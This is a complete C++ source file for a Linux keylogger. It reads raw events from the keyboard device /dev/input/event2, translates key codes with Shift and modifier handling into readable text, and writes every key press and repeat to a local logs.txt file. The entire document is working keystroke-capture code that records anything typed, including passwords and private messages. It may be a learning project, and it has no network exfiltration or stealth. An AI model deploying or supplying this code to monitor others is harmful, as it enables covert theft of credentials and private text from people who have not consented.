#include <iostream>               // For cout and cin
#include <vector>
#include <algorithm>
#include <unordered_map>          // To map input codes with real keys
#include <string>                 // To user strings
#include <fcntl.h>                // To use open() system call
#include <unistd.h>               // To use read() and close() system call
#include <linux/input.h>          // To use input_event struct
#include <cstdlib>                // To use exit()                        

std::unordered_map<__u16, std::string> keyMap = {
    // Numbers
    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"}, {KEY_5, "5"},
    {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"}, {KEY_0, "0"},
    
    // Letters (lowercase)
    {KEY_Q, "q"}, {KEY_W, "w"}, {KEY_E, "e"}, {KEY_R, "r"}, {KEY_T, "t"},
    {KEY_Y, "y"}, {KEY_U, "u"}, {KEY_I, "i"}, {KEY_O, "o"}, {KEY_P, "p"},
    {KEY_A, "a"}, {KEY_S, "s"}, {KEY_D, "d"}, {KEY_F, "f"}, {KEY_G, "g"},
    {KEY_H, "h"}, {KEY_J, "j"}, {KEY_K, "k"}, {KEY_L, "l"}, {KEY_Z, "z"},
    {KEY_X, "x"}, {KEY_C, "c"}, {KEY_V, "v"}, {KEY_B, "b"}, {KEY_N, "n"},
    {KEY_M, "m"},
    
    // Symbols
    {KEY_MINUS, "-"}, {KEY_EQUAL, "="}, {KEY_LEFTBRACE, "["}, 
    {KEY_RIGHTBRACE, "]"}, {KEY_SEMICOLON, ";"}, {KEY_APOSTROPHE, "'"},
    {KEY_GRAVE, "`"}, {KEY_BACKSLASH, "\\"}, {KEY_COMMA, ","},
    {KEY_DOT, "."}, {KEY_SLASH, "/"},    

    // Numpad
    {KEY_KP0, "0"}, {KEY_KP1, "1"}, {KEY_KP2, "2"}, {KEY_KP3, "3"},
    {KEY_KP4, "4"}, {KEY_KP5, "5"}, {KEY_KP6, "6"}, {KEY_KP7, "7"},
    {KEY_KP8, "8"}, {KEY_KP9, "9"}, {KEY_KPMINUS, "-"}, {KEY_KPPLUS, "+"},
    {KEY_KPDOT, "."}, {KEY_KPSLASH, "/"}, {KEY_KPASTERISK, "*"},
    {KEY_KPEQUAL, "="},
    
    // Special keys
    {KEY_ENTER, "[ENTER]"}, {KEY_KPENTER, "[ENTER]"}, {KEY_TAB, "[TAB]"},
    {KEY_BACKSPACE, "[BACKSPACE]"}, {KEY_ESC, "[ESC]"}, {KEY_DELETE, "[DEL]"},
    {KEY_INSERT, "[INS]"}, {KEY_HOME, "[HOME]"}, {KEY_END, "[END]"},
    {KEY_PAGEUP, "[PGUP]"}, {KEY_PAGEDOWN, "[PGDN]"}, {KEY_UP, "[UP]"},
    {KEY_DOWN, "[DOWN]"}, {KEY_LEFT, "[LEFT]"}, {KEY_RIGHT, "[RIGHT]"}, 
    {KEY_SPACE, "[SPACE]"},
    
    // Function keys
    {KEY_F1, "[F1]"}, {KEY_F2, "[F2]"}, {KEY_F3, "[F3]"}, {KEY_F4, "[F4]"},
    {KEY_F5, "[F5]"}, {KEY_F6, "[F6]"}, {KEY_F7, "[F7]"}, {KEY_F8, "[F8]"},
    {KEY_F9, "[F9]"}, {KEY_F10, "[F10]"}, {KEY_F11, "[F11]"}, {KEY_F12, "[F12]"},
    
    // Modifier keys
    {KEY_LEFTSHIFT, "[LSHIFT]"}, {KEY_RIGHTSHIFT, "[RSHIFT]"},
    {KEY_LEFTCTRL, "[LCTRL]"}, {KEY_RIGHTCTRL, "[RCTRL]"},
    {KEY_LEFTALT, "[LALT]"}, {KEY_RIGHTALT, "[RALT]"},
    {KEY_LEFTMETA, "[LWIN]"}, {KEY_RIGHTMETA, "[RWIN]"},
    {KEY_CAPSLOCK, "[CAPS]"}, {KEY_NUMLOCK, "[NUMLOCK]"},
    {KEY_SCROLLLOCK, "[SCROLL]"},
};

// Shift key mappings for characters that change with Shift
std::unordered_map<__u16, std::string> shiftKeyMap = {
    {KEY_1, "!"}, {KEY_2, "@"}, {KEY_3, "#"}, {KEY_4, "$"}, {KEY_5, "%"},
    {KEY_6, "^"}, {KEY_7, "&"}, {KEY_8, "*"}, {KEY_9, "("}, {KEY_0, ")"},
    {KEY_MINUS, "_"}, {KEY_EQUAL, "+"}, {KEY_LEFTBRACE, "{"}, 
    {KEY_RIGHTBRACE, "}"}, {KEY_SEMICOLON, ":"}, {KEY_APOSTROPHE, "\""},
    {KEY_GRAVE, "~"}, {KEY_BACKSLASH, "|"}, {KEY_COMMA, "<"},
    {KEY_DOT, ">"}, {KEY_SLASH, "?"},
    
    // Letters with shift (uppercase)
    {KEY_Q, "Q"}, {KEY_W, "W"}, {KEY_E, "E"}, {KEY_R, "R"}, {KEY_T, "T"},
    {KEY_Y, "Y"}, {KEY_U, "U"}, {KEY_I, "I"}, {KEY_O, "O"}, {KEY_P, "P"},
    {KEY_A, "A"}, {KEY_S, "S"}, {KEY_D, "D"}, {KEY_F, "F"}, {KEY_G, "G"},
    {KEY_H, "H"}, {KEY_J, "J"}, {KEY_K, "K"}, {KEY_L, "L"}, {KEY_Z, "Z"},
    {KEY_X, "X"}, {KEY_C, "C"}, {KEY_V, "V"}, {KEY_B, "B"}, {KEY_N, "N"},
    {KEY_M, "M"},
};

// Check if key is a modifier key
bool isModifier(__u16 keycode) {
    return (keycode == KEY_LEFTSHIFT || keycode == KEY_RIGHTSHIFT ||
            keycode == KEY_LEFTALT || keycode == KEY_RIGHTALT ||
            keycode == KEY_LEFTCTRL || keycode == KEY_RIGHTCTRL ||
            keycode == KEY_LEFTMETA || keycode == KEY_RIGHTMETA);
}

// Get the modifier name to print
std::string getModifierName(__u16 keycode) {
    if(keycode == KEY_LEFTSHIFT || keycode == KEY_RIGHTSHIFT)
        return "Shift";
    else if(keycode == KEY_LEFTALT || keycode == KEY_RIGHTALT)
        return "Alt";
    else if(keycode == KEY_LEFTCTRL || keycode == KEY_RIGHTCTRL)
        return "Ctrl";
    else if(keycode == KEY_LEFTMETA || keycode == KEY_RIGHTMETA)
        return "Meta";
    else
        return "[UNKOWN MODIFIER]";
}

// If only shift is pressed
bool onlyShiftModifier(std::vector<__u16> activeModifiers){
    return activeModifiers.size() == 1 && (activeModifiers[0]
        == KEY_LEFTSHIFT || activeModifiers[0] == KEY_RIGHTSHIFT); 
}

// Get the string to log for a key
std::string getKeyString(__u16 keycode, const std::vector<__u16>&
        activeModifiers){
    std::string result = "";
    if(onlyShiftModifier(activeModifiers)){
       result += shiftKeyMap[keycode]; 
    }
    else{
        for(size_t i=0; i<activeModifiers.size(); i++){
            result += getModifierName(activeModifiers[i]);
            result += "+";
        }
        result += keyMap[keycode];
    }

    return result;
}

void captureEvents(std::string &kbd_device){

    // Opening keyboard file in Read Mode
    int input_fd = open(kbd_device.c_str(), O_RDONLY, 0);
    // Checking if file opened successfully 
    if(input_fd == -1){
        std::cout << "Error opening input file" << '\n';
        exit(-1);
    }

    // Creating file to store captured keys
    int output_fd = open("logs.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    // Chekcing if file created and opened successfully
    if(output_fd == -1){
        std::cout << "Error creating log file" << '\n';
        close(input_fd);
        exit(-1);
    }

    // input_event object to make a buffer to store key inputs
    struct input_event inputs;
    std::vector<__u16> activeModifiers;
    std::vector<__u16> pressedKeys; // Track all pressed keys

    while(1){

        // Reading from input_fd in inputs struct
        read(input_fd, &inputs, sizeof(inputs));

        // If input is not of a key type than ignore that 
        if(inputs.type != EV_KEY) continue;         

        // Key is released
        if(inputs.value == 0){
            auto keyIt = std::find(pressedKeys.begin(),
                    pressedKeys.end(), inputs.code);
            if(keyIt != pressedKeys.end()) {
                pressedKeys.erase(keyIt);
            }

            if(isModifier(inputs.code)) {
                auto modIt = std::find(activeModifiers.begin(), 
                        activeModifiers.end(), inputs.code);
                if(modIt != activeModifiers.end()) {
                    activeModifiers.erase(modIt);
                }
            }
        }

        // Key is pressed
        if(inputs.value == 1){
            pressedKeys.push_back(inputs.code);
            if(isModifier(inputs.code)) {
                activeModifiers.push_back(inputs.code);
            }
            else {
                std::string result = getKeyString(inputs.code,
                        activeModifiers) + "\n";
 
                write(output_fd, result.c_str(), result.size());
            }
        }
        
        // Key is hold
        if(inputs.value == 2 && !isModifier(inputs.code)){
            if(activeModifiers.empty() || onlyShiftModifier(activeModifiers)) {
                std::string result = getKeyString(inputs.code, 
                        activeModifiers) + " (repeat)\n";
                write(output_fd, result.c_str(), result.size());
            }    
        }


    }

    close(input_fd);
    close(output_fd);
}

int main(){
    // Hardcorded keyboard device file location
    std::string kbd_device = "/dev/input/event2";

    // Function to read input events and convert them in readable keys and write those in log.txt
    captureEvents(kbd_device);
}
